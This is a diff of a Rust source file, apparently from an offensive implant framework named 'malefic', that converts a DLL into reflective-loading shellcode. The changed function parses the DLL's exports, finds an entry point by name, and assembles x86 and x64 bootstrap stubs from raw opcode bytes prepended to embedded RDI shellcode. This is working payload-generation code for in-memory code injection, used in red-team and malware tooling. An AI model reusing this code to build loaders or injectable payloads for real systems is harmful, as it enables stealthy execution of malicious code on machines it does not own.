@@ -1,20 +1,19 @@
 use goblin::pe::PE;
 
-use crate::GenerateArch;
+use crate::config::GenerateArch;
 
-use super::{shellcode::{MALEFIC_RDI_SHELLCODE_32, MALEFIC_RDI_SHELLCODE_64}, utils::{hash_function_name, pack}};
+use super::{
+    shellcode::{MALEFIC_RDI_SHELLCODE_32, MALEFIC_RDI_SHELLCODE_64},
+    utils::pack,
+};
 
 pub fn malefic_shellcode_rdi_from_bytes(
     arch: &GenerateArch,
     dll_bytes: &[u8],
     function_name: &str,
-    user_data: &[u8]
+    user_data: &[u8],
 ) -> Result<Vec<u8>, String> {
     let flags = 0;
-    let mut function_hash = 0;
-    if !function_name.is_empty() {
-        function_hash = hash_function_name(function_name);
-    }
     let pe = match PE::parse(dll_bytes) {
         Ok(pe) => pe,
         Err(e) => {
@@ -23,15 +22,17 @@ pub fn malefic_shellcode_rdi_from_bytes(
     };
 
     let mut function_offset = 0;
-    if function_hash.ne(&0) {
+    if !function_name.is_empty() {
         for func in pe.exports {
             match func.name {
                 Some(name) => {
-                    if hash_function_name(name).eq(&function_hash) {
-                        function_offset = func.rva;
-                        break;
+                    if function_name.ne(name) {
+                        continue;
                     }
-                },
+                    function_offset = func.rva;
+                    log::info!("entry point off is 0x{:x}", function_offset);
+                    break;
+                }
                 None => {
                     continue;
                 }
@@ -40,30 +41,19 @@ pub fn malefic_shellcode_rdi_from_bytes(
     }
     match arch {
         GenerateArch::X64 => {
-            convert_to_x86_64_shellcode(
-                dll_bytes, 
-                function_offset as _, 
-                user_data, 
-                flags
-            )
+            convert_to_x86_64_shellcode(dll_bytes, function_offset as _, user_data, flags)
         }
         GenerateArch::X86 => {
-            convert_to_x86_shellcode(
-                dll_bytes, 
-                function_offset as _, 
-                user_data, 
-                flags
-            )
+            convert_to_x86_shellcode(dll_bytes, function_offset as _, user_data, flags)
         }
     }
 }
-
 
 pub fn convert_to_x86_64_shellcode(
     dll_bytes: &[u8],
     entrypoint_offset: u32,
     user_data: &[u8],
-    _flags: u32
+    _flags: u32,
 ) -> Result<Vec<u8>, String> {
     let mut final_shellcode: Vec<u8> = Vec::new();
     // let bootstrap_size = 35;
@@ -90,7 +80,7 @@ pub fn convert_to_x86_64_shellcode(
     bootstrap.push(b'\x56');
     // mov rsi, rsp
     bootstrap.extend_from_slice(b"\x48\x89\xe6");
-    // and rsp, 0xfffffffffffffff0 
+    // and rsp, 0xfffffffffffffff0
     bootstrap.extend_from_slice(b"\x48\x83\xe4\xf0");
     // sub rsp, 0x30
     bootstrap.extend_from_slice(b"\x48\x83\xec\x20");
@@ -120,7 +110,7 @@ pub fn convert_to_x86_shellcode(
     dll_bytes: &[u8],
     entrypoint_offset: u32,
     user_data: &[u8],
-    _flags: u32
+    _flags: u32,
 ) -> Result<Vec<u8>, String> {
     let mut final_shellcode: Vec<u8> = Vec::new();
     let bootstrap_size = 40;
@@ -155,7 +145,7 @@ pub fn convert_to_x86_shellcode(
     bootstrap.extend_from_slice(b"\x00\x00\x00");
     bootstrap.extend_from_slice(b"\x83\xc4\x10");
     bootstrap.push(b'\xc3');
-    bootstrap.extend_from_slice(b"\xe9\xcd\x11\x00\x00");
+    bootstrap.extend_from_slice(b"\xe9\xf1\x11\x00\x00");
 
     final_shellcode.extend_from_slice(&bootstrap);
     final_shellcode.extend_from_slice(MALEFIC_RDI_SHELLCODE_32);
